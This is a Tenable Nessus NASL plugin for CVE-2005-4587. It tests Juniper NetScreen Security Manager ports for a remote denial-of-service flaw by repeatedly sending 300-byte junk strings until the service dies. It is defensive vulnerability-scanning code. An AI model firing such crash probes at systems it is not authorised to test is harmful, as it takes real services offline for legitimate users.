#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(20388);
  script_version("1.18");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2005-4587");
  script_bugtraq_id(16075);

  script_name(english:"Juniper NetScreen Security Manager (NSM) guiSrv/devSrv Crafted String Remote DoS");

  script_set_attribute(attribute:"synopsis", value:
"The remote server is affected by a remote denial of service flaw.");
  script_set_attribute(attribute:"description", value:
"The version of Juniper NetScreen-Security Manager (NSM) installed on
the remote host may allow an attacker to deny service to legitimate
users using specially crafted long strings to the guiSrv and devSrv
processes.  A watchdog service included in Juniper NSM, though,
automatically restarts the application. 

By repeatedly sending a malformed request, an attacker may permanently
deny access to legitimate users.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/fulldisclosure/2005/Dec/1304");
  script_set_attribute(attribute:"see_also", value:"http://www.juniper.net/customers/support/products/nsm.jsp");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Juniper NSM version 2005.1");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/12/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/01/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Firewalls");

  script_copyright(english:"This script is Copyright (C) 2006-2022 Tenable Network Security, Inc.");

  script_require_ports(7800, 7801);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");

if ( ! thorough_tests ) exit(0);

port = 7800;
if ( ! port ) exit(0);
soc = open_sock_tcp(port);
if (! soc) exit(0);
nbtest=50;
cz=raw_string(0xff,0xed,0xff,0xfd,0x06);
teststr=crap(300)+'\r\n';

send(socket:soc, data:cz+'\r\n');
while(nbtest-->0)
{
  send(socket:soc, data:teststr);
  if (service_is_dead(port: port) > 0)
  {
    security_hole(port);
    close(soc);
    exit(0);
  }
}
close(soc);
